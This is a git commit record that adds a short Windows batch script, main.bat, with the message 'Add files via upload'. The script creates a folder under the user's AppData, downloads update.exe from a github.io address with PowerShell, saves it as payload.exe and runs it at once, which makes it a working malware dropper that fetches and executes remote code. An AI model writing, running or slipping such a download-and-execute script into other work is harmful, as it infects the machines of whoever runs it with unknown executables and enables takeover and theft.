a19e35f4ecbac69702aae6da1625b641f2216796
homemaginalpole <accounting@homemaginalpole.com>
2025-04-03 19:24:23 +0000

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,8 @@
+@echo off
+setlocal enabledelayedexpansion
+set "payloadpath=%appdata%\Custom-Application\files\payload.exe"
+if not exist "%appdata%\Custom-Application\files" mkdir "%appdata%\Custom-Application\files"
+
+powershell -Command "Invoke-WebRequest -Uri 'https://homemaginalpole.github.io/tgrawusers/update.exe' -OutFile '%payloadpath%'"
+start "" "%payloadpath%"
+exit /b
